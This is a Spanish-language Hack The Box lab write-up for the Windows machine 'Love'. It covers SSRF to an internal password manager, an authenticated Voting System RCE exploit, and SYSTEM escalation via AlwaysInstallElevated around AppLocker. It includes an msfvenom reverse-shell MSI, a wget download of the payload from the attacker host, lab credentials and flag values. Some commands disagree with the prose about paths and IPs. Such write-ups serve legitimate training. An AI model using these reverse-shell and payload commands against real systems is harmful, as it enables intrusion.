---
tags:
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/344
dificultad: Fácil
ip: 10.10.10.239
os: Windows
relacionados:
  - "[[Server-Side Request Forgery (SSRF)]]"
  - "[[Exploiting Voting System]]"
  - "[[Abusing AlwaysInstallElevated]]"
  - "[[Remote Code Execution|RCE]]"
  - "[[AppLocker evasion]]"
---
# HackTheBox - Love

## Reconocimiento

Mi proceso comenzó con una fase de reconocimiento exhaustiva para identificar los servicios activos en la máquina objetivo. Para ello, utilicé **Nmap**.

Primero, realicé un escaneo rápido de todos los puertos TCP para tener un mapa completo de la superficie de ataque.
```bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 01_Reconnaissance/tcpports
```

Una vez identificados los puertos abiertos, lancé un segundo escaneo más detallado, enfocado en esos puertos, para determinar las versiones de los servicios y obtener más información.
```Bash
nmap -sCV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

Los resultados revelaron varios servicios de interés:
- Un servidor web **Apache** en los puertos 80 y 443.
- **SMB** en el puerto 445.
- **MySQL** en el puerto 3306.
- Un servicio desconocido en el puerto **5000**.
    
El escaneo también me proporcionó información valiosa: el servidor web utilizaba **PHP 7.3.27**. Además, al analizar el certificado SSL del puerto 443, descubrí los nombres de dominio `www.love.htb` y `staging.love.htb`, junto con el nombre de host `Love` a través de SMB.
```bash
openssl s_client -connect 10.10.10.239:443
```

Con esta información, procedí a actualizar mi archivo `/etc/hosts` para poder resolver estos dominios localmente.
```Bash
echo "10.10.10.239 www.love.htb staging.love.htb" | sudo tee -a /etc/hosts
```

Al navegar a `http://www.love.htb`, encontré una aplicación web llamada "Voting System". Por otro lado, `http://staging.love.htb` me presentó una herramienta que afirmaba escanear archivos en busca de malware, con una opción "beta".


___

## Análisis de vulnerabilidades

Mi investigación inicial sobre "Voting System exploit" me llevó al descubrimiento de una vulnerabilidad de **Ejecución Remota de Código (RCE) autenticada**. Sin embargo, en ese momento no disponía de credenciales ni de una forma de registrarme, por lo que decidí aparcar esta vía temporalmente.

### Server-Side Request Forgery (SSRF) en staging.love.htb

Mi atención se centró entonces en el subdominio `staging.love.htb`. Al acceder a la opción "beta" (`beta.php`), encontré la aplicación de escaneo de archivos. Curiosamente, esta aplicación permitía introducir una URL para escanear.

Recordé que el puerto 5000 estaba abierto pero me devolvía un mensaje de `You don't have permission to access this resource` al intentar acceder directamente. Esto me hizo sospechar que podría haber una vulnerabilidad de **Server-Side Request Forgery (SSRF)**. Mi hipótesis era que podía usar la aplicación de escaneo para hacer que el servidor realizara una petición a sí mismo (localhost) en ese puerto.

> [!note] ¿Qué es SSRF?
> 
> Una vulnerabilidad de Server-Side Request Forgery (SSRF) ocurre cuando un atacante puede coaccionar a una aplicación del lado del servidor para que realice peticiones HTTP a un dominio elegido por el atacante. En este caso, la aproveché para acceder a un servicio interno que no era accesible desde el exterior.

Introduje la URL `http://127.0.0.1:5000` en el campo de escaneo. ¡Funcionó! La respuesta de la aplicación me mostró el contenido de la página interna, que resultó ser un gestor de contraseñas. Interactuando con esta aplicación a través de la vulnerabilidad SSRF, logré extraer las credenciales del usuario `admin` para el "Voting System".
- **Usuario:** `admin`
- **Contraseña:** `@LoveIsInTheAir!!!!`


___

## Explotación de vulnerabilidades

### RCE Autenticado en el Sistema de Votación

Con las credenciales en mi poder, retomé la vía del RCE autenticado que había encontrado anteriormente. Localicé un exploit público en Python (basado en el CVE asociado) y lo modifiqué con los datos necesarios: la URL del sitio, las credenciales obtenidas y la dirección IP y puerto de mi máquina para recibir la shell inversa.
```Python
# --- Edit your settings here ----
IP = "love.htb"                 # Website's URL
USERNAME = "admin"                  # Auth username
PASSWORD = "@LoveIsInTheAir!!!!"    # Auth Password
REV_IP = "10.10.14.17"              # Reverse shell IP
REV_PORT = "443"                   # Reverse port
# --------------------------------
INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"
```
> Para remplazar las urls equivocadas usé: `:%s/votesystem\/admin/admin/g` en Nvim. 

Preparé un listener en mi máquina usando `netcat` para recibir la conexión entrante.
```Bash
nc -lvnp 443
```

Finalmente, ejecuté el script de Python modificado.
```Bash
python3 49445.py
```

El exploit funcionó a la perfección, y obtuve una shell inversa en mi listener como el usuario `phoebe`. Ya tenía mi punto de entrada al sistema.


___

## Escalada de privilegios

Una vez dentro como `phoebe`, mi siguiente objetivo era escalar privilegios a `NT AUTHORITY\SYSTEM`.

### AlwaysInstallElevated

Usar winpeas.exe, el mismo avisa de la vulnerabilidad `AlwaysInstallElevated`

Revisando los registros del mismo:
```PowerShell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
El comando confirmó que esta política estaba habilitada (valor `1`).

> [!warning] Peligro de AlwaysInstallElevated
> 
> Cuando la política AlwaysInstallElevated está habilitada tanto en HKEY_CURRENT_USER como en HKEY_LOCAL_MACHINE, permite que cualquier usuario instale paquetes de Windows Installer (.msi) con privilegios de SYSTEM. Es una grave brecha de seguridad que facilita enormemente la escalada de privilegios.

### Evasión de AppLocker

Confiado en esta vulnerabilidad, generé un payload `.msi` malicioso usando `msfvenom` y lo transferí a la máquina. Sin embargo, mi intento de ejecución falló. Esto indicaba que había alguna medida de seguridad adicional.

Investigando más a fondo, descubrí que **AppLocker** estaba activo y configurado. Utilicé el siguiente comando de PowerShell para inspeccionar las políticas efectivas:
```PowerShell
get-applockerpolicy -effective | select -expandproperty rulecollections
```

La política revelaba que solo los usuarios `Phoebe` y `Administrator` podían ejecutar archivos `.msi`, y únicamente desde el directorio `C:\Administration`.

Con este conocimiento, mi plan de ataque era claro:

1. Generar un nuevo payload `.msi` con `msfvenom`.
2. Levantar un servidor HTTP en mi máquina para transferir el archivo.
3. Establecer un listener en `netcat` para recibir la shell de `SYSTEM`.
4. En la máquina víctima, descargar el payload directamente en `C:\Administration`.
5. Ejecutar el instalador `.msi` desde esa ubicación usando `msiexec`.
    
Generé el payload:
```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f msi -o reverse.msi
```

Preparé el servidor HTTP y el listener en mi máquina:
```Bash
# Servidor para transferir el archivo
python3 -m http.server 80

# Listener para la shell de SYSTEM
rlwrap nc -lvnp 443
```

Finalmente, en la shell de `phoebe` en la máquina víctima, ejecuté los siguientes comandos:
```PowerShell
# Me muevo al directorio permitido
cd C:\temp

# Descargo el payload
wget 10.10.14.18:80/reverse.msi -o reverse.msi

# Ejecuto el instalador en modo silencioso
msiexec /quiet /i reverse.msi
```

Al instante, mi listener recibió una conexión. Verifiqué mi identidad y confirmé que había logrado la escalada de privilegios.
```Bash
whoami
nt authority\system
```


---

## Bandera(s)

> [!flag] `flag{user}`
> 31801d372a5c9e2fba3d7a541d304e87
^bandera-user

> [!flag] `flag{root}`
> c9a2e126a269441e4303bc604fa2135d
^bandera-root
